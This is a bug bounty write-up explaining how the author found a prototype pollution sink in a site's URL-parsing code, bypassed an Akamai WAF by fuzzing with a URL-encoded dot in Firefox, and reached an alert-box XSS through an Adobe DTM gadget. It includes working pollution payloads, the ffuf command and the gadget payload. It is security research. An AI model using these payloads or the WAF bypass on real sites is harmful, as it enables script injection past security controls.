A couple of weeks back Max posted a tweet regarding prototype pollution (pp) where he had trouble with Akamai WAF and couldn't exploit pp coz of the waf.
He was happy to collaborate , split the bounty so I spent much time in bypassing this and at first it looked almost impossible I somehow managed to bypass it in the end.

As nothing of this worked I was curios myself what was the issue and I haven't found any prototype pollution bugs in real websites so it would be fun I thought.

![chrome_F3WCZkQHV9](https://github.com/Sudistark/BB-Writeups/assets/31372554/d56d44cc-46b4-40e6-b930-a75efae2c2e2)




Max shared the site so I first started with checking which vulnerable library was responsible for this in order to identify the sink 

Soon enough identified the sink:

```js
$(document).ready(function() {
    var e = getSearchOrHashBased(location.href); [1]
    if (e && !jQuery.isEmptyObject(e)) {
        var n = getJsonFromUrl(e);
```

```js
function getJsonFromUrl(e) {
    var n = {};
    return e.split("&").forEach(function(e) {
        if (e) {
            var t = (e = e.split("+").join(" ")).indexOf("=")
              , a = t > -1 ? e.substr(0, t) : e
              , i = t > -1 ? decodeURIComponent(e.substr(t + 1)) : ""
              , o = a.indexOf("[");
            if (-1 == o)
                n[decodeURIComponent(a)] = i;
            else {
                var s = a.indexOf("]", o)
                  , r = decodeURIComponent(a.substring(o + 1, s));
                a = decodeURIComponent(a.substring(0, o)),
                n[a] || (n[a] = []),
                r ? n[a][r] = i : n[a].push(i) // prototype pollution here [2]
            }
        }
    }),
    n
}
```

The method name says it all `getJsonFromUrl` , it converts query parameters to a json object

```json
/?sudi=shirley will be converted to 

{"sudi":"shirley"}
```

As the above method doesn't performs any check againsts the key before performing the operation on line [2], this code is vulnerable to prototype pollution.

From this snyk advisory: https://security.snyk.io/vuln/SNYK-JS-LITESPEEDJS-2359250 you can find more details 

```
PoC
add the following query string ?__proto__[polluted]=yes

open the browser developer console. The property polluted has value yes
```



But it wasn't as simple as what was mentioned in the POC as Akamai WAF was doing a good job here.

----------------

The source is `location.href` , on line [1] you can see that it calls `getSearchOrHashBased` method which extracts the query parameter from the url including hash fragment part.



```js
function getSearchOrHashBased(e) {
    e || (e = location.href);
    var n = e.indexOf("?")
      , t = e.indexOf("#");
    return -1 == t && -1 == n ? {} : (-1 == t && (t = e.length),
    -1 == n || t == n + 1 ? e.substring(t) : e.substring(n + 1, t))
}
```

This method is used to extract params either from the search or hash parameters from a URL.If there is # in the url and no ? , the hash parameters will be passed on and search params will be ignored.


Bypassing Akamai looked very easy at first ,as seeing source if from fragment part which will not be sent to the server and hence the WAF wouldn't trigger.

But just coz of one silly mistake it didn't worked. Can you figure it out what might be the problem? Use your Sharingan and take a good look at the code again (just kiding :p)

The developer forgot to remove the `#` part from the parameters 

```js
>getSearchOrHashBased("https://example.com/?sudi=shirley")
'sudi=shirley'
>getSearchOrHashBased("https://example.com/#sudi=shirley")
'#sudi=shirley'
```

Just because of a silly  mistake , this was passed as a key instead of just the parameter name `#sudi`.So upon using `#__proto__[x]=x` wouldn't worke as 

```js
n["#__proto__"]["x"] = "x" // #__proto__ is undefined

```

```js
>n = {}
{}

>n["#__proto__"]["x"] = "x"
VM54:1 Uncaught TypeError: Cannot set properties of undefined (setting 'x')
    at <anonymous>:1:22
(anonymous) @ VM54:1

>n["__proto__"]["x"] = "x"
'x'

>n.__proto__
{x: 'x', constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, …}
```


As `#` part failed we need to rely on the query params itself.

We can try using `contructor.prototype` property instead of `__proto__` 

```js
x = {}
{}
x.__proto__
{constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}
x.constructor.prototype
{constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}
x.constructor.prototype === x.__proto__
true
```

But this is not useful in our case as the code doesn't iterates over all the properties recursively and also Akamai blocks the constructor keyword when used inside of `[constructor]`


The legend Gareth himself also pointed out some solutions so I tried them too:

https://twitter.com/garethheyes/status/1657837036030554115

1. constructor.prototype

As the dot notation isn't supported in our case I used this instead `constructor[prototype][polluted]`
But as already pointed out `[prototype]` was blocked by Akamai

2. *Try url encoding square brackets or using the hash instead of the query string. Other than that you’d probably need to use the existing code to bypass the WAF*

Url encoded (double url encode also) square brackets were still blocked by Akamai

In addition I also tried url encoding `__proto__` and the property which is place inside square brackets as in the `getJsonFromUrl` method you can see `decodeURIComponent` is used.

And already mentioned hash instead of query string isn't an option coz of a silly mistake from developer's side.

3. *Oh I forgot obvious stuff like whitespace between brackets etc. JS supports all sorts of whitespace*

To explain this here's an example,  javaScript is a whitespace-insensitive programming language, which means that it largely ignores whitespace characters like spaces, tabs, and line breaks:

```js
Object.__proto__.x = 1337
1337
Object.__proto__.x
1337
Object.__proto__. x
1337
Object.__proto__ . x
1337
Object. __proto__ . x
1337
Object.                   __proto__ . x
```

But still this was also blocked by Akamai

Some more solutions which I suggested myself: https://twitter.com/sudhanshur705/status/1657753816241147904

---------------------

**Analyzing the WAF**

https://www.target.com/?__proto__            -> allowed
https://www.target.com/?__proto__[]=x        -> allowed
https://www.target.com/?__proto__[x]=x       -> blocked
https://www.target.com/?__proto__[1]=x       -> blocked


I spent almost a whole day and it seemed impossible to bypass, as there are only very limited variations I could do in case prototype pollution. In case of xss you have a no of tags,etc to try but here the options are limited.

So I started fuzzing query params adding some url encoded stuff which might break the WAF


Jub0bs recently posted a writeuop about a beautiful chain of bugs
https://jub0bs.com/posts/2023-05-05-smorgasbord-of-a-bug-chain/

Where he was able to bypass Akamai, by removing the `?` from the url and using `&` instead.


![image](https://github.com/Sudistark/BB-Writeups/assets/31372554/a34b0177-e763-4368-9b7c-85c3f6045959)



I tried the same thing but it didn't worked, so I though there might be more similar ways to bypass Akamai waf. SO I fuzzed different portions of the url

Like this:

```
https://www.target.com/?__proto__[FUZZx]=x
https://www.target.com/?__proto__[x]FUZZ=x
https://www.target.com/?__proto__[FUZZx]=x
https://www.target.com/?FUZZ__proto__[x]=x
https://www.target.com/FUZZ?__proto__[x]=x
```

I used this wordlist: https://gist.github.com/Sudistark/d3e5f9e5dcad77c7e6560cb4b5ad66c8 , which contaions a list of url encoded characters.

The results were suprising one of them actually worked and returned 200 ok. Can you guess which url it was from the above 5 ?



```bash
ffuf -w urlencoded.txt -u "https://www.target.com/FUZZ?__proto__[x]=x"


%2e                     [Status: 200, Size: 26150, Words: 4216, Lines: 558, Duration: 2532ms]
```

Ahhh that's `.`


But when I tried opening this url in my chrome browser: https://www.target.com/%2e?__proto__[x]=x
The dot was automatically removed (consumed), which is normal behaviour I guess as browsers as you might have seen browsers normalizes ../ also.

Then I remebered that Firefox is the exception here as it doesn't consumes the  url encoded `.` and it still stays there.
So I again opened the same url now in firefox and this time it worked and also bypassed Akamai WAF.I checked the console to confirm if prototype pollution is working or not 

```js
>x = {}
Object {  }

>x.__proto__
Object { x: "x", … }

>x.x
"x" 
```

And yeah here we finally managed to bypass Akamai :)



Now comes finding the prototype pollution gagdet part, DomInvader has an inbuilt gagdet scanner.As I already saw some 3rd prty libraries like Adobe Dynamic Tag Management were in use in that page. I just picked up the gadget from here: https://github.com/BlackFan/client-side-prototype-pollution


https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/adobe-dtm.md

```
?__proto__[src]=data:,alert(1)//
```

Here's the screenshot of the alert popup

![firefox_cgm1PDt65D](https://github.com/Sudistark/BB-Writeups/assets/31372554/9d1ff684-95ce-4017-897a-2a68576945e5)
